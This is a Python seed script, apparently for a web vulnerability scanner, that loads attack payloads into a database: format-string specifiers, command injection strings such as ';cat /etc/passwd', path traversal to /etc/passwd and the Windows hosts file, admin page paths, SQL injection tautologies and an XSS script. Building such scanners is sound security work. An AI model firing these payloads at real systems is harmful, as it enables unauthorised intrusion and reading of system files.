from backend.crud import create_payload
from backend.database import SessionLocal
from backend.models import VulType

db = SessionLocal()

#format string vulnerability
create_payload(db, VulType.FORMAT_STRING, "%x")
create_payload(db, VulType.FORMAT_STRING, "%s")
create_payload(db, VulType.FORMAT_STRING, "%p")
create_payload(db, VulType.FORMAT_STRING, "%n")
create_payload(db, VulType.FORMAT_STRING, "%hn")
create_payload(db, VulType.FORMAT_STRING, "%c")
create_payload(db, VulType.FORMAT_STRING, "%1$s")
create_payload(db, VulType.FORMAT_STRING, "%1$")
create_payload(db, VulType.FORMAT_STRING, "%100c")
create_payload(db, VulType.FORMAT_STRING, "%x %x %x %x")
create_payload(db, VulType.FORMAT_STRING, "%p %p %p %p")
create_payload(db, VulType.FORMAT_STRING, "%s %s %s %s")
create_payload(db, VulType.FORMAT_STRING, "%08x.%08x.%08x.%08x")
create_payload(db, VulType.FORMAT_STRING, "%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%s")

#run os command
create_payload(db, VulType.RUN_OS_COMMAND, ";ls")
create_payload(db, VulType.RUN_OS_COMMAND, "&&ls")
create_payload(db, VulType.RUN_OS_COMMAND, "|ls")
create_payload(db, VulType.RUN_OS_COMMAND, "|ls|")
create_payload(db, VulType.RUN_OS_COMMAND, "$(ls)")
create_payload(db, VulType.RUN_OS_COMMAND, "\nls\n")
create_payload(db, VulType.RUN_OS_COMMAND, ">ls>")
create_payload(db, VulType.RUN_OS_COMMAND, "-ls")
create_payload(db, VulType.RUN_OS_COMMAND, ";cat /etc/passwd")
create_payload(db, VulType.RUN_OS_COMMAND, "&&cat /etc/passwd")
create_payload(db, VulType.RUN_OS_COMMAND, "|cat /etc/passwd")
create_payload(db, VulType.RUN_OS_COMMAND, ";uname -a")
create_payload(db, VulType.RUN_OS_COMMAND, "&&uname -a")
create_payload(db, VulType.RUN_OS_COMMAND, "|uname -a")
create_payload(db, VulType.RUN_OS_COMMAND, "'ls'")
create_payload(db, VulType.RUN_OS_COMMAND, "'cat /etc/passwd'")

#diretory indexing
create_payload(db, VulType.DIRECTORY_INDEXING, "/")
create_payload(db, VulType.DIRECTORY_INDEXING, "/img")
create_payload(db, VulType.DIRECTORY_INDEXING, "/css")
create_payload(db, VulType.DIRECTORY_INDEXING, "/js")
create_payload(db, VulType.DIRECTORY_INDEXING, "/../")
create_payload(db, VulType.DIRECTORY_INDEXING, "img/../")
create_payload(db, VulType.DIRECTORY_INDEXING, "%3f.jsp")
create_payload(db, VulType.DIRECTORY_INDEXING, "/page.php?path=/")
create_payload(db, VulType.DIRECTORY_INDEXING, "/../../../etc/")
create_payload(db, VulType.DIRECTORY_INDEXING, "/../../../var")
create_payload(db, VulType.DIRECTORY_INDEXING, "/%2e%2e%2f")

#insufficient authentication + 기타 체크 필요
#쿠키 변조, 헤더 변조, Post
create_payload(db, VulType.INSUFFICIENT_AUTHENTICATION, "/admin/")
create_payload(db, VulType.INSUFFICIENT_AUTHENTICATION, "/user")
create_payload(db, VulType.INSUFFICIENT_AUTHENTICATION, "/user/2")
create_payload(db, VulType.INSUFFICIENT_AUTHENTICATION, "/view?id=1")

#missing process validation
create_payload(db, VulType.MISSING_PROCESS_VALIDATION, "/../")

#administrator page exposure
create_payload(db, VulType.ADMINISTRATOR_PAGE_EXPOSURE, "/admin/")
create_payload(db, VulType.ADMINISTRATOR_PAGE_EXPOSURE, "/admin/login")
create_payload(db, VulType.ADMINISTRATOR_PAGE_EXPOSURE, "/administrator")
create_payload(db, VulType.ADMINISTRATOR_PAGE_EXPOSURE, "/administrator/login")
create_payload(db, VulType.ADMINISTRATOR_PAGE_EXPOSURE, "/admin.php")
create_payload(db, VulType.ADMINISTRATOR_PAGE_EXPOSURE, "/secure")
create_payload(db, VulType.ADMINISTRATOR_PAGE_EXPOSURE, "/index.php?page=admin")
create_payload(db, VulType.ADMINISTRATOR_PAGE_EXPOSURE, "/controlpanel/")
create_payload(db, VulType.ADMINISTRATOR_PAGE_EXPOSURE, "/wp-admin/")
create_payload(db, VulType.ADMINISTRATOR_PAGE_EXPOSURE, "/secure/login")
create_payload(db, VulType.ADMINISTRATOR_PAGE_EXPOSURE, "/../../admin/")

#route tracking
create_payload(db, VulType.ROUTE_TRACKING, "/../../../../etc/passwd")
create_payload(db, VulType.ROUTE_TRACKING, "\..\..\..\..\windows\system32\drivers\etc\hosts")
create_payload(db, VulType.ROUTE_TRACKING, "..%2f..%2f..%2f..%2fetc%2fpasswd")
create_payload(db, VulType.ROUTE_TRACKING, "..%5c..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts")
create_payload(db, VulType.ROUTE_TRACKING, "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd")
create_payload(db, VulType.ROUTE_TRACKING, "%252e%252e%255c%252e%252e%255c%252e%252e%255c%252e%252e%255cwindows%255csystem32%255cdrivers%255cetc%255chosts")
create_payload(db, VulType.ROUTE_TRACKING, "/page.php?file=../../../../etc/passwd")
create_payload(db, VulType.ROUTE_TRACKING, "/page.php?file=..%2f..%2f..%2f..%2fetc%2fpasswd")
create_payload(db, VulType.ROUTE_TRACKING, "../../../../etc/passwd%00")

#sql injection
create_payload(db, VulType.SQL_INJECTION, "' OR 1=1 --")
create_payload(db, VulType.SQL_INJECTION, "' OR ''='")
create_payload(db, VulType.SQL_INJECTION, "' OR 'a'='a")
create_payload(db, VulType.SQL_INJECTION, "' OR 1=1#")

#xss
create_payload(db, VulType.XSS, "<script>alert('XSS')</script>")

db.close()